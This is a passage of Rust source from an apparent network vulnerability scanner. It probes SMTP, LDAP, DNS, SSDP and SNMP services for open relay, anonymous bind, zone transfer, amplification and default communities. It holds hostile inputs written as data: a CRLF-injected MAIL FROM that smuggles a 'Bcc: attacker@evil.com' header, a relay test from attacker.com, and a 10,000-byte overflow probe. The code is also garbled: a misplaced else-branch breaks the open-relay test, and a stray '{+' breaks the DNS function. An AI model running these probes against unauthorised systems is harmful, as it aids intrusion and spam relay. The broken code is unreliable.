/// Tests SMTP for banner, STARTTLS absence, open relay, and software CVEs.
async fn fuzz_smtp_vulnerabilities(
    target: &str,
    port: u16,
) -> anyhow::Result<Vec<String>> {
    let ip = resolve_host(target).await?;
    let mut logs = Vec::new();
    
    logs.push(format!("[FUZZ-SMTP] Starting SMTP vulnerability detection on port {}", port));
    
    match test_smtp_banner_and_tls(target, port, ip).await {
        Ok(banner_logs) => logs.extend(banner_logs),
        Err(e) => logs.push(format!("[FUZZ-SMTP] Banner test error: {}", e)),
    }
    
    match detect_smtp_software_vulnerabilities(target, port, ip).await {
        Ok(vuln_logs) => logs.extend(vuln_logs),
        Err(e) => logs.push(format!("[FUZZ-SMTP] Software detection error: {}", e)),
    }
    
    match test_smtp_dangerous_commands(target, port, ip).await {
        Ok(cmd_logs) => logs.extend(cmd_logs),
        Err(e) => logs.push(format!("[FUZZ-SMTP] Command test error: {}", e)),
    }
    
    match test_smtp_specific_vulnerabilities(target, port, ip).await {
        Ok(spec_logs) => logs.extend(spec_logs),
        Err(e) => logs.push(format!("[FUZZ-SMTP] Specific vulnerability test error: {}", e)),
    }
    
    logs.push("[FUZZ-SMTP] Completed SMTP vulnerability scanning".into());
    Ok(logs)
}

async fn test_smtp_banner_and_tls(target: &str, port: u16, ip: std::net::IpAddr) -> anyhow::Result<Vec<String>> {
    let mut logs = Vec::new();
    logs.push("[FUZZ-SMTP-BANNER] Testing SMTP banner and TLS support".into());
    
    let addr = SocketAddr::new(ip, port);
    
    match time::timeout(Duration::from_millis(5000), TcpStream::connect(addr)).await {
        Ok(Ok(mut stream)) => {
            let mut buf = [0u8; 512];
            match time::timeout(Duration::from_millis(1000), stream.read(&mut buf)).await {
                Ok(Ok(n)) if n > 0 => {
                    let banner = String::from_utf8_lossy(&buf[..n]);
                    
                    logs.push("[FUZZ-SMTP-BANNER]  SMTP Banner detected".into());
                    logs.push(format!("[FUZZ-SMTP-BANNER] {}", banner.trim()));
                    
                    if banner.contains("Sendmail") {
                        logs.push("[FUZZ-SMTP-BANNER] Software: Sendmail".into());
                    } else if banner.contains("Postfix") {
                        logs.push("[FUZZ-SMTP-BANNER] Software: Postfix".into());
                    } else if banner.contains("Exim") {
                        logs.push("[FUZZ-SMTP-BANNER] Software: Exim".into());
                    } else if banner.contains("qmail") {
                        logs.push("[FUZZ-SMTP-BANNER] Software: Qmail".into());
                    } else if banner.contains("ESMTP") {
                        logs.push("[FUZZ-SMTP-BANNER]  Extended SMTP (ESMTP) supported".into());
                    }
                    
                    let mut stream_check = TcpStream::connect(addr).await?;
                    stream_check.write_all(b"EHLO test\r\n").await?;
                    let mut buf2 = [0u8; 512];
                    match stream_check.read(&mut buf2).await {
                        Ok(n) => {
                            let resp = String::from_utf8_lossy(&buf2[..n]);
                            if resp.contains("STARTTLS") {
                                logs.push("[FUZZ-SMTP-BANNER]  STARTTLS supported (may allow downgrade attacks)".into());
                            }
                            if resp.contains("AUTH") {
                                logs.push("[FUZZ-SMTP-BANNER]  AUTH mechanisms supported".into());
                            }
                        }
                        Err(_) => {}
                    }
                }
                _ => {
                    logs.push("[FUZZ-SMTP-BANNER]  Could not read SMTP banner".into());
                }
            }
        }
        _ => {
            logs.push(format!("[FUZZ-SMTP] Cannot connect to {}:{}", target, port));
        }
    }
    
    Ok(logs)
}

async fn detect_smtp_software_vulnerabilities(_target: &str, port: u16, ip: std::net::IpAddr) -> anyhow::Result<Vec<String>> {
    let mut logs = Vec::new();
    logs.push("[FUZZ-SMTP-VULN] Detecting software vulnerabilities".into());
    
    let addr = SocketAddr::new(ip, port);
    
    match time::timeout(Duration::from_millis(3000), TcpStream::connect(addr)).await {
        Ok(Ok(mut stream)) => {
            let mut buf = [0u8; 512];
            match time::timeout(Duration::from_millis(1000), stream.read(&mut buf)).await {
                Ok(Ok(n)) if n > 0 => {
                    let banner = String::from_utf8_lossy(&buf[..n]);
                    let banner_lower = banner.to_lowercase();
                    
                    let detected_version = banner
                        .split_whitespace()
                        .find(|w| w.chars().filter(|c| c.is_digit(10) || *c == '.').count() > 1)
                        .unwrap_or("unknown");
                    
                    let known_vulns = smtp_known_vulnerabilities();
                    let mut found_software = false;
                    
                    for (software, _, _, _) in known_vulns {
                        if banner_lower.contains(&software.to_lowercase()) {
                            found_software = true;
                            logs.push(format!(
                                "[FUZZ-SMTP-VULN]  Software detected: {}",
                                software
                            ));
                            
                            if detected_version != "unknown" {
                                logs.push(format!(
                                    "[FUZZ-SMTP-VULN]    Detected version: {}",
                                    detected_version
                                ));
                                
                                let applicable_cves = get_cves_for_software(software, detected_version).await;
                                
                                if !applicable_cves.is_empty() {
                                    logs.push(format!(
                                        "[FUZZ-SMTP-VULN]     Found {} vulnerabilities for this version:",
                                        applicable_cves.len()
                                    ));
                                    for (cve, description) in applicable_cves {
                                        logs.push(format!(
                                            "[FUZZ-SMTP-VULN]       • {} - {}",
                                            cve, description
                                        ));
                                    }
                                } else {
                                    logs.push("[FUZZ-SMTP-VULN]     No known vulnerabilities for this version".into());
                                }
                            } else {
                                logs.push("[FUZZ-SMTP-VULN]    Version not detected, cannot assess vulnerabilities".into());
                            }
                            break;
                        }
                    }
                    
                    if !found_software && detected_version != "unknown" {
                        logs.push(format!(
                            "[FUZZ-SMTP-VULN] Server version: {}",
                            detected_version
                        ));
                    }
                }
                _ => {}
            }
        }
        _ => {}
    }
    
    Ok(logs)
}

async fn test_smtp_dangerous_commands(_target: &str, port: u16, ip: std::net::IpAddr) -> anyhow::Result<Vec<String>> {
    let mut logs = Vec::new();
    logs.push("[FUZZ-SMTP-CMD] Testing dangerous SMTP commands".into());
    
    let dangerous_commands = vec![
        ("VRFY", "VRFY test\r\n", "User enumeration"),
        ("EXPN", "EXPN test\r\n", "Mailing list expansion"),
        ("RCPT TO", "RCPT TO: test@example.com\r\n", "Recipient validation without sender"),
        ("DEBUG", "DEBUG\r\n", "Debug mode enable"),
        ("ETRN", "ETRN example.com\r\n", "External traffic channel"),
    ];
    
    let addr = SocketAddr::new(ip, port);
    
    for (cmd_name, cmd, risk) in dangerous_commands {
        match time::timeout(Duration::from_millis(2000), TcpStream::connect(addr)).await {
            Ok(Ok(mut stream)) => {
                let mut buf = [0u8; 512];
                let _ = stream.read(&mut buf).await;
                
                let _ = stream.write_all(b"EHLO scanner\r\n").await;
                let _ = stream.read(&mut buf).await;
                
                let _ = stream.write_all(cmd.as_bytes()).await;
                
                let n = stream.read(&mut buf).await.unwrap_or(0);
                let resp = String::from_utf8_lossy(&buf[..n]);
                
                if resp.contains("250") || resp.contains("251") || resp.contains("252") {
                    logs.push(format!(
                        "[FUZZ-SMTP-CMD]  VULNERABLE: {} command allowed ({})",
                        cmd_name, risk
                    ));
                    
                    if cmd_name == "VRFY" {
                        logs.push("[FUZZ-SMTP-CMD]    This allows user enumeration attacks".into());
                    } else if cmd_name == "EXPN" {
                        logs.push("[FUZZ-SMTP-CMD]    This reveals mailing list members".into());
                    } else if cmd_name == "RCPT TO" {
                        logs.push("[FUZZ-SMTP-CMD]    This allows unauthorized relay checks".into());
                    }
                } else if resp.contains("502") || resp.contains("503") {
                    logs.push(format!(
                        "[FUZZ-SMTP-CMD]  {} command blocked (good security practice)",
                        cmd_name
                    ));
                }
            }
            _ => {
                break;
            }
        }
    }
    
    Ok(logs)
}

async fn test_smtp_specific_vulnerabilities(_target: &str, port: u16, ip: std::net::IpAddr) -> anyhow::Result<Vec<String>> {
    let mut logs = Vec::new();
    logs.push("[FUZZ-SMTP-SPEC] Testing SMTP-specific vulnerabilities".into());
    
    let addr = SocketAddr::new(ip, port);
    
    match time::timeout(Duration::from_millis(3000), TcpStream::connect(addr)).await {
        Ok(Ok(mut stream)) => {
            let mut buf = [0u8; 512];
            let _ = stream.read(&mut buf).await;
            
            let _ = stream.write_all(b"EHLO attacker.com\r\n").await;
            let _ = stream.read(&mut buf).await;
            
            let _ = stream.write_all(b"MAIL FROM: <attacker@attacker.com>\r\n").await;
            let n1 = stream.read(&mut buf).await.unwrap_or(0);
            let resp1 = String::from_utf8_lossy(&buf[..n1]);
            
            if resp1.contains("250") {
                    } else {
                        logs.push("[FUZZ-SMTP-BANNER]  STARTTLS not advertised; plaintext SMTP in use.".into());
                let n2 = stream.read(&mut buf).await.unwrap_or(0);
                let resp2 = String::from_utf8_lossy(&buf[..n2]);
                
                if resp2.contains("250") {
                    logs.push("[FUZZ-SMTP-SPEC]  OPEN RELAY VULNERABILITY: Server accepts unauthorized messages".into());
                    logs.push("[FUZZ-SMTP-SPEC]    Server may be used for spam distribution".into());
                }
            }
        }
        _ => {}
    }
    
    match time::timeout(Duration::from_millis(2000), TcpStream::connect(addr)).await {
        Ok(Ok(mut stream)) => {
            let mut buf = [0u8; 512];
            let _ = stream.read(&mut buf).await;
            
            let _ = stream.write_all(b"EHLO test\r\n").await;
            let _ = stream.read(&mut buf).await;
            
            let malicious_subject = "MAIL FROM: <test@example.com>\r\nBcc: attacker@evil.com\r\n";
            let _ = stream.write_all(malicious_subject.as_bytes()).await;
            
            let n = stream.read(&mut buf).await.unwrap_or(0);
            let resp = String::from_utf8_lossy(&buf[..n]);
            
            if resp.contains("250") {
                logs.push("[FUZZ-SMTP-SPEC]  Possible CRLF injection in MAIL FROM (header injection)".into());
            }
        }
        _ => {}
    }
    
    match time::timeout(Duration::from_millis(2000), TcpStream::connect(addr)).await {
        Ok(Ok(mut stream)) => {
            let mut buf = [0u8; 512];
            let _ = stream.read(&mut buf).await;
            
            let long_string = "A".repeat(10000);
            let cmd = format!("VRFY {}\r\n", long_string);
            let _ = stream.write_all(cmd.as_bytes()).await;
            
            match time::timeout(Duration::from_millis(500), stream.read(&mut buf)).await {
                Ok(Err(_)) | Err(_) => {
                    logs.push("[FUZZ-SMTP-SPEC]  Server may crash on long input (possible buffer overflow)".into());
                }
                _ => {}
            }
        }
        _ => {}
    }
    
    match time::timeout(Duration::from_millis(2000), TcpStream::connect(addr)).await {
        Ok(Ok(mut stream)) => {
            let mut buf = [0u8; 512];
            let _ = stream.read(&mut buf).await;
            
            let _ = stream.write_all(b"ehlo scanner\r\n").await;
            let n = stream.read(&mut buf).await.unwrap_or(0);
            let resp = String::from_utf8_lossy(&buf[..n]);
            
            if resp.contains("250") {
                logs.push("[FUZZ-SMTP-SPEC]  Server accepts lowercase SMTP commands".into());
            }
        }
        _ => {}
    }
    
    Ok(logs)
}

#[derive(Debug, Serialize, Clone)]
struct ServiceInfo {
    name: String,
    version: Option<String>,
    extra: Vec<String>,
}

/// Guesses service name from port number or banner string.
fn guess_service(port: u16, banner: &Option<String>) -> Option<String> {
    match port {
        80 | 8080 | 8000 | 443 => Some("http".into()),
        21 => Some("ftp".into()),
        22 => Some("ssh".into()),
        23 => Some("telnet".into()),
        25 => Some("smtp".into()),
        _ => {
            if let Some(b) = banner {
                if b.to_lowercase().contains("ssh") {
                    return Some("ssh".into());
                }
            }
            None
        }
    }
}

/// Extracts HTTP header value (case-insensitive key match).
fn extract_header(resp: &str, header: &str) -> Option<String> {
    for line in resp.lines() {
        if line.to_lowercase().starts_with(&header.to_lowercase()) {
            return line
                .splitn(2, ':')
                .nth(1)
                .map(|v| v.trim().to_string());
        }
    }
    None
}

/// Builds standard DNS query packet for given domain and query type.
fn build_dns_query(name: &str, qtype: u16) -> Vec<u8> {
    let mut packet = Vec::new();
    packet.push(0x12);
    packet.push(0x34);
    packet.push(0x01);
    packet.push(0x00);
    packet.push(0x00);
    packet.push(0x01);
    packet.extend_from_slice(&[0x00, 0x00, 0x00, 0x00, 0x00, 0x00]);

    for label in name.split('.') {
        packet.push(label.len() as u8);
        packet.extend_from_slice(label.as_bytes());
    }
    packet.push(0);

    packet.push((qtype >> 8) as u8);
    packet.push((qtype & 0xFF) as u8);
    packet.push(0x00);
    packet.push(0x01);

    packet
}

fn build_dns_query_with_do(name: &str, qtype: u16) -> Vec<u8> {
    let mut packet = build_dns_query(name, qtype);
    packet[10] = 0x00;
    packet[11] = 0x01;

    packet.push(0); // NAME = root
    packet.push(0x00);
    packet.push(0x29); // TYPE = OPT (41)
    packet.push(0x10);
    packet.push(0x00); // UDP payload size 4096
    packet.push(0x00); // Extended RCODE
    packet.push(0x00); // EDNS Version
    packet.push(0x80);
    packet.push(0x00); // Flags: DO=1 (0x8000)
    packet.push(0x00);
    packet.push(0x00); // RDLEN = 0

    packet
}

/// Extracts service info from HTTP response headers (Server, X-Powered-By, etc.).
fn fingerprint_http(resp: &str) -> ServiceInfo {
    let mut extra = Vec::new();

    let server = extract_header(resp, "Server");
    let powered = extract_header(resp, "X-Powered-By");

    if let Some(s) = &server {
        extra.push(format!("Server: {}", s));
    }
    if let Some(p) = &powered {
        extra.push(format!("X-Powered-By: {}", p));
    }

    let version = server.as_ref().and_then(|s| {
        s.split_whitespace().find(|w| w.chars().any(|c| c.is_digit(10)))
    });

    ServiceInfo {
        name: "http".into(),
        version: version.map(|v| v.to_string()),
        extra,
    }
}

/// Tests LDAP for anonymous bind, StartTLS absence, and RootDSE attribute extraction.
async fn fuzz_ldap_vulnerabilities(target: &str, port: u16) -> anyhow::Result<Vec<String>> {
    let ip = resolve_host(target).await?;
    let mut logs = Vec::new();

    logs.push("[FUZZ-LDAP] Starting LDAP/LDAPS checks".into());

    let addr = SocketAddr::new(ip, port);

    let bind_packet: [u8; 14] = [
        0x30, 0x0c, // LDAPMessage SEQUENCE
        0x02, 0x01, 0x01, // messageID = 1
        0x60, 0x07, // BindRequest [APPLICATION 0], length 7
        0x02, 0x01, 0x03, // version = 3
        0x04, 0x00, // name = ""
        0x80, 0x00, // authentication simple = ""
    ];

    let bind_result = async {
        let mut stream = TcpStream::connect(addr).await?;
        stream.write_all(&bind_packet).await?;
        let mut buf = [0u8; 512];
        let n = tokio::time::timeout(std::time::Duration::from_secs(3), stream.read(&mut buf))
            .await
            .unwrap_or(Ok(0))?;
        Ok::<(usize, [u8; 512]), std::io::Error>((n, buf))
    }
    .await;

    match bind_result {
        Ok((n, buf)) if n > 0 => {
            let mut success = false;
            for i in 0..n.saturating_sub(2) {
                if buf[i] == 0x0a && buf[i + 1] == 0x01 && buf[i + 2] == 0x00 {
                    success = true;
                    break;
                }
            }
            if success {
                logs.push("[FUZZ-LDAP]  Anonymous simple bind accepted".into());
            } else {
                logs.push("[FUZZ-LDAP]  Bind responded (likely refused anonymous)".into());
            }
            logs.push("[FUZZ-LDAP] Response received for anonymous bind".into());
        }
        Ok(_) => {
            logs.push("[FUZZ-LDAP] No response to bind".into());
        }
        Err(e) => {
            logs.push(format!("[FUZZ-LDAP] Bind/connect error: {}", e));
            if port == 636 {
                logs.push("[FUZZ-LDAP] Hint: LDAPS requires TLS; not attempted without TLS client".into());
            }
        }
    }

    if port == 389 {
        let starttls_packet: [u8; 31] = [
            0x30, 0x16, // SEQUENCE len 22
            0x02, 0x01, 0x02, // messageID=2
            0x77, 0x11, // ExtendedRequest [APPLICATION 23] len 17
            0x80, 0x0f, // requestName (context-specific 0) len 15
            0x31, 0x2e, 0x33, 0x2e, 0x36, 0x2e, 0x31, 0x2e,
            0x34, 0x2e, 0x31, 0x2e, 0x31, 0x34, 0x36, 0x36,
            0x2e, 0x32, 0x30, 0x30, 0x33, 0x37,
        ];

        let starttls = async {
            let mut stream = TcpStream::connect(addr).await?;
            stream.write_all(&starttls_packet).await?;
            let mut buf = [0u8; 512];
            let n = tokio::time::timeout(std::time::Duration::from_secs(3), stream.read(&mut buf))
                .await
                .unwrap_or(Ok(0))?;
            Ok::<(usize, [u8; 512]), std::io::Error>((n, buf))
        }
        .await;

        match starttls {
            Ok((n, buf)) if n > 5 => {
                let mut starttls_ok = false;
                for i in 0..n.saturating_sub(2) {
                    if buf[i] == 0x0a && buf[i + 1] == 0x01 && buf[i + 2] == 0x00 {
                        starttls_ok = true;
                        break;
                    }
                }
                if starttls_ok {
                    logs.push("[FUZZ-LDAP]  StartTLS supported (extended op success)".into());
                } else {
                    logs.push("[FUZZ-LDAP]  StartTLS not accepted (extended op refused)".into());
                    logs.push("[FUZZ-LDAP]  Without StartTLS/TLS, LDAP traffic is cleartext and subject to MITM.".into());
                }
            }
            _ => {
                logs.push("[FUZZ-LDAP] StartTLS probe failed".into());
                logs.push("[FUZZ-LDAP]  StartTLS unavailable; ensure TLS/LDAPS or signing/channel binding is enforced.".into());
            }
        }

        let rootdse_req: [u8; 56] = [
            0x30, 0x36, // SEQUENCE len 54
            0x02, 0x01, 0x03, // messageID=3
            0x63, 0x31, // SearchRequest [APPLICATION 3] len 49
            0x04, 0x00, // baseObject = ""
            0x0a, 0x01, 0x00, // scope = baseObject (0)
            0x0a, 0x01, 0x03, // derefAliases = never (3)
            0x02, 0x02, 0x03, 0xe8, // sizeLimit = 1000
            0x02, 0x02, 0x00, 0x00, // timeLimit = 0
            0x01, 0x01, 0x00, // typesOnly = FALSE
            0x87, 0x0b, // filter: present (context-specific 7) len 11
            0x6f, 0x62, 0x6a, 0x65, 0x63, 0x74, 0x43, 0x6c, 0x61, 0x73, 0x73,
            0x30, 0x0f, // attributes sequence len 15
            0x04, 0x0d, // attribute: supportedCapabilities
            0x73, 0x75, 0x70, 0x70, 0x6f, 0x72, 0x74, 0x65, 0x64, 0x43, 0x61, 0x70, 0x73,
        ];

        let rootdse = async {
            let mut stream = TcpStream::connect(addr).await?;
            stream.write_all(&rootdse_req).await?;
            let mut buf = [0u8; 1024];
            let n = tokio::time::timeout(std::time::Duration::from_secs(3), stream.read(&mut buf))
                .await
                .unwrap_or(Ok(0))?;
            Ok::<(usize, [u8; 1024]), std::io::Error>((n, buf))
        }.await;

        match rootdse {
            Ok((n, buf)) if n > 0 => {
                logs.push("[FUZZ-LDAP]  RootDSE responded (capabilities/version can be enumerated)".into());
                
                parse_rootdse_response(&buf[0..n], &mut logs);
            }
            _ => {
                logs.push("[FUZZ-LDAP] RootDSE query failed or no response".into());
            }
        }

        logs.push("[FUZZ-LDAP] Note: LDAP signing/channel binding not validated here; enforce on server for security.".into());
    }

    let ldap_cves = get_applicable_cves("LDAP", "");
    if !ldap_cves.is_empty() {
        logs.push(format!("[FUZZ-LDAP] CVE references for LDAP servers: {} entries", ldap_cves.len()));
        for (cve, desc) in ldap_cves {
            logs.push(format!("[FUZZ-LDAP]    • {} - {}", cve, desc));
        }
    }

    Ok(logs)
}

fn parse_rootdse_response(data: &[u8], logs: &mut Vec<String>) {
    if data.len() < 5 {
        return;
    }

    let mut pos = 0;

    if data[pos] != 0x30 {
        return;
    }
    pos += 1;

    let (seq_len, len_bytes) = parse_ber_length(&data[pos..]);
    pos += len_bytes;

    if seq_len == 0 {
        return;
    }

    if pos < data.len() && data[pos] == 0x04 {
        pos += 1;
        let (name_len, len_bytes) = parse_ber_length(&data[pos..]);
        pos += len_bytes + name_len;
    }

    if pos < data.len() && data[pos] == 0x30 {
        pos += 1;
        let (attrs_len, len_bytes) = parse_ber_length(&data[pos..]);
        pos += len_bytes;

        let attrs_end = pos + attrs_len;

        while pos < attrs_end && pos < data.len() {
            if data[pos] != 0x30 {
                break;
            }
            pos += 1;

            let (attr_len, len_bytes) = parse_ber_length(&data[pos..]);
            pos += len_bytes;

            let attr_end = pos + attr_len;

            if pos < data.len() && data[pos] == 0x04 {
                pos += 1;
                let (type_len, len_bytes) = parse_ber_length(&data[pos..]);
                pos += len_bytes;

                let attr_type = String::from_utf8_lossy(&data[pos..pos + type_len]).to_string();
                pos += type_len;

                if pos < data.len() && data[pos] == 0x31 {
                    pos += 1;
                    let (vals_len, len_bytes) = parse_ber_length(&data[pos..]);
                    pos += len_bytes;

                    let vals_end = pos + vals_len;

                    while pos < vals_end && pos < data.len() {
                        if data[pos] != 0x04 {
                            break;
                        }
                        pos += 1;

                        let (val_len, len_bytes) = parse_ber_length(&data[pos..]);
                        pos += len_bytes;

                        let value = String::from_utf8_lossy(&data[pos..pos + val_len]).to_string();
                        pos += val_len;

                        match attr_type.as_str() {
                            "vendorVersion" => {
                                logs.push(format!("[FUZZ-LDAP] 📦 Vendor Version: {}", value));
                            }
                            "vendorName" => {
                                logs.push(format!("[FUZZ-LDAP] 📦 Vendor Name: {}", value));
                            }
                            "supportedSASLMechanisms" => {
                                logs.push(format!(
                                    "[FUZZ-LDAP] 🔐 Supported SASL Mechanism: {}",
                                    value
                                ));
                                if value.to_uppercase() == "PLAIN" || value.to_uppercase() == "CRAM-MD5" {
                                    logs.push(
                                        "[FUZZ-LDAP]  Weak SASL mechanism detected; use SCRAM-SHA-256".into(),
                                    );
                                }
                            }
                            "supportedCapabilities" => {
                                logs.push(format!("[FUZZ-LDAP] ✨ Capability: {}", value));
                                match value.as_str() {
                                    "1.3.6.1.4.1.1466.20037" => {
                                        logs.push("[FUZZ-LDAP] ✨ StartTLS supported (OID 1.3.6.1.4.1.1466.20037)".into());
                                    }
                                    "1.3.6.1.4.1.1466.20037.1" => {
                                        logs.push("[FUZZ-LDAP] ✨ All Operational Attributes (1.3.6.1.4.1.1466.20037.1)".into());
                                    }
                                    "1.2.840.113556.1.4.1781" => {
                                        logs.push("[FUZZ-LDAP] ✨ LDAP Read Limits (AD OID)".into());
                                    }
                                    _ => {}
                                }
                            }
                            "objectClass" => {
                                logs.push(format!("[FUZZ-LDAP] 🏗️ Object Class: {}", value));
                            }
                            "namingContexts" => {
                                logs.push(format!("[FUZZ-LDAP] 📍 Naming Context: {}", value));
                            }
                            _ => {
                                if attr_type.starts_with("supported") || attr_type.starts_with("vendor") {
                                    logs.push(format!("[FUZZ-LDAP] [{}] {}", attr_type, value));
                                }
                            }
                        }
                    }
                }
            }

            pos = attr_end;
        }
    }
}

fn parse_ber_length(data: &[u8]) -> (usize, usize) {
    if data.is_empty() {
        return (0, 1);
    }

    let first = data[0];
    if first < 128 {
        (first as usize, 1)
    } else {
        let num_octets = (first & 0x7f) as usize;
        if data.len() < 1 + num_octets {
            return (0, 1 + num_octets);
        }

        let mut length = 0usize;
        for i in 1..=num_octets {
            length = (length << 8) | (data[i] as usize);
        }
        (length, 1 + num_octets)
    }
}

/// Tests DNS for recursion, DNSSEC support, and zone transfer (AXFR).
async fn fuzz_dns_vulnerabilities(target: &str, port: u16) -> anyhow::Result<Vec<String>> {
    let ip = resolve_host(target).await?;
    let mut logs = Vec::new();

    logs.push("[FUZZ-DNS] Starting DNS vulnerability checks".into());

    let recursion_flags = async {
        let socket = tokio::net::UdpSocket::bind(("0.0.0.0", 0)).await?;
        socket.connect((ip, port)).await?;
        let query = build_dns_query("example.com", 1);
        socket.send(&query).await?;
        let mut buf = [0u8; 2048];
        let n = tokio::time::timeout(std::time::Duration::from_secs(3), socket.recv(&mut buf)).await
            .unwrap_or(Ok(0))?;
        Ok::<(usize, [u8; 2048]), std::io::Error>((n, buf))
    }.await;

    if let Ok((n, buf)) = recursion_flags {
        if n >= 4 {
            let flags = ((buf[2] as u16) << 8) | buf[3] as u16;
            let ra = flags & 0x0080 != 0;
            let rcode = flags & 0x000F;
            if ra {
                logs.push("[FUZZ-DNS]  Recursion available (RA=1). Possible open resolver.".into());
                if rcode == 0 {
                    logs.push("[FUZZ-DNS]  Server answered recursive query.".into());
                }
            } else {
                logs.push("[FUZZ-DNS]  Recursion not available (RA=0)".into());
            }
        } else {
            logs.push("[FUZZ-DNS] No DNS response for recursion test".into());
        }
    } else {
        logs.push("[FUZZ-DNS] Error performing recursion test".into());
    }

    let dnssec_test = async {
        let socket = tokio::net::UdpSocket::bind(("0.0.0.0", 0)).await?;
        socket.connect((ip, port)).await?;
        let query = build_dns_query_with_do("example.com", 1);
        socket.send(&query).await?;
        let mut buf = [0u8; 2048];
        let n = tokio::time::timeout(std::time::Duration::from_secs(3), socket.recv(&mut buf)).await
            .unwrap_or(Ok(0))?;
        Ok::<(usize, [u8; 2048]), std::io::Error>((n, buf))
    }.await;

    match dnssec_test {
        Ok((n, buf)) if n > 12 => {
            let mut dnssec_ok = false;
            for i in 0..n.saturating_sub(10) {
                if i + 10 < n && buf[i] == 0x00 && buf[i + 1] == 0x00 && buf[i + 2] == 0x29 {
                    // flags i+7,i+8
                    let flags = ((buf[i + 7] as u16) << 8) | buf[i + 8] as u16;
                    if flags & 0x8000 != 0 {
                        dnssec_ok = true;
                        break;
                    }
                }
            }

            if dnssec_ok {
                logs.push("[FUZZ-DNS]  DNSSEC (DO bit) supported".into());
            } else {
                logs.push("[FUZZ-DNS]  DNSSEC (DO bit) not honored; cache poisoning risk higher.".into());
            }
        }
        _ => {
            logs.push("[FUZZ-DNS]  Could not verify DNSSEC (no OPT/DO in response)".into());
        }
    }

    let axfr = async {
        let addr = SocketAddr::new(ip, port);
        let mut stream = TcpStream::connect(addr).await?;
        let query = build_dns_query("example.com", 252); // AXFR = 252
        let mut prefixed = Vec::new();
        prefixed.push(((query.len() >> 8) & 0xFF) as u8);
        prefixed.push((query.len() & 0xFF) as u8);
        prefixed.extend_from_slice(&query);
        stream.write_all(&prefixed).await?;
        let mut buf = [0u8; 4096];
        let n = tokio::time::timeout(std::time::Duration::from_secs(5), stream.read(&mut buf)).await
            .unwrap_or(Ok(0))?;
        Ok::<(usize, [u8; 4096]), std::io::Error>((n, buf))
    }.await;

    match axfr {
        Ok((n, buf)) => {
            if n >= 4 {
                let flags = ((buf[2] as u16) << 8) | buf[3] as u16;
                let rcode = flags & 0x000F;
                if rcode == 0 && n > 12 {
                    logs.push("[FUZZ-DNS]  Zone transfer (AXFR) may be allowed (got response)".into());
                } else {
                    logs.push(format!("[FUZZ-DNS] AXFR refused (rcode={})", rcode));
                }
            } else {
                logs.push("[FUZZ-DNS] AXFR no response".into());
            }
        }
        Err(_) => {
            logs.push("[FUZZ-DNS] AXFR connection failed or timed out".into());
        }
    }

    if logs.iter().any(|l| l.contains("Recursion available")) {+
        logs.push("[FUZZ-DNS]  Recursion without DNSSEC can enable cache poisoning/spoofing.".into());
    }

    Ok(logs)
}

async fn fuzz_ssdp_vulnerabilities(target: &str, port: u16) -> anyhow::Result<Vec<String>> {
    let ip = resolve_host(target).await?;
    let mut logs = Vec::new();

    logs.push("[FUZZ-SSDP] Starting SSDP/UPnP checks".into());

    let request = b"M-SEARCH * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\nMAN: \"ssdp:discover\"\r\nMX: 2\r\nST: ssdp:all\r\n\r\n";

    let result = async {
        let socket = tokio::net::UdpSocket::bind(("0.0.0.0", 0)).await?;
        socket.connect((ip, port)).await?;
        socket.send(request).await?;

        let mut buf = [0u8; 2048];
        let n = tokio::time::timeout(Duration::from_secs(3), socket.recv(&mut buf))
            .await
            .unwrap_or(Ok(0))?;
        Ok::<(usize, Vec<u8>), std::io::Error>((n, buf[..n].to_vec()))
    }
    .await;

    match result {
        Ok((n, resp)) if n > 0 => {
            let text = String::from_utf8_lossy(&resp);
            logs.push(format!("[FUZZ-SSDP] Response received ({} bytes)", n));

            if n > request.len() * 3 && n > 200 {
                logs.push("[FUZZ-SSDP]  Possible amplification vector (large SSDP response).".into());
            }

            if let Some(location) = extract_header(&text, "LOCATION") {
                logs.push(format!("[FUZZ-SSDP] LOCATION: {}", location));
            }
            if let Some(server) = extract_header(&text, "SERVER") {
                logs.push(format!("[FUZZ-SSDP] SERVER: {}", server));
            }
            if let Some(usn) = extract_header(&text, "USN") {
                logs.push(format!("[FUZZ-SSDP] USN: {}", usn));
            }

            logs.push("[FUZZ-SSDP]  UPnP device responds on UDP/1900; ensure WAN-side access is filtered.".into());
        }
        _ => {
            logs.push("[FUZZ-SSDP] No SSDP response".into());
        }
    }

    Ok(logs)
}

/// Tests SNMP v1/v2c with common communities (public/private) and extracts sysDescr.
async fn fuzz_snmp_vulnerabilities(target: &str, port: u16) -> anyhow::Result<Vec<String>> {
    let ip = resolve_host(target).await?;
    let mut logs = Vec::new();

    logs.push("[FUZZ-SNMP] Starting SNMP checks".into());

    let communities = ["public", "private"];
    let versions = [1i32, 0i32]; // v2c=1, v1=0

    let sysdescr_oid: [u8; 8] = [0x2b, 0x06, 0x01, 0x02, 0x01, 0x01, 0x01, 0x00];

    for &ver in &versions {
        for &community in &communities {
            let req = build_snmp_get(sysdescr_oid, community, ver, 42);

            let result = async {
                let sock = tokio::net::UdpSocket::bind(("0.0.0.0", 0)).await?;
                sock.connect((ip, port)).await?;
                sock.send(&req).await?;

                let mut buf = [0u8; 2048];
                let n = tokio::time::timeout(Duration::from_secs(3), sock.recv(&mut buf))
                    .await
                    .unwrap_or(Ok(0))?;
                Ok::<(usize, Vec<u8>), std::io::Error>((n, buf[..n].to_vec()))
            }
            .await;

            match result {
                Ok((n, resp)) if n > 0 => {
                    let prefix = if ver == 1 { "v2c" } else { "v1" };
                    logs.push(format!("[FUZZ-SNMP]  Response for community '{}' ({})", community, prefix));

                    if let Some(sysdescr) = parse_snmp_sysdescr(&resp, &sysdescr_oid) {
                        logs.push(format!("[FUZZ-SNMP] sysDescr: {}", sysdescr));
                    } else {
                        logs.push("[FUZZ-SNMP] Received response but sysDescr not parsed".into());
                    }
                }
                _ => {
                    let prefix = if ver == 1 { "v2c" } else { "v1" };
                    logs.push(format!("[FUZZ-SNMP] No response for community '{}' ({})", community, prefix));
                }
            }
        }
    }

    if !logs.iter().any(|l| l.contains("Response for community")) {
        logs.push("[FUZZ-SNMP]  No responses; service may be SNMPv3-only or filtered.".into());
    }

    Ok(logs)
}

fn build_snmp_get(oid: [u8; 8], community: &str, version: i32, request_id: i32) -> Vec<u8> {
    let mut varbind = Vec::new();
    varbind.push(0x30);
    varbind.push((2 + 2 + oid.len()) as u8); // len of OID + NULL
    varbind.push(0x06);
    varbind.push(oid.len() as u8);
    varbind.extend_from_slice(&oid);
    varbind.push(0x05);
    varbind.push(0x00); // NULL

    let mut vblist = Vec::new();
    vblist.push(0x30);
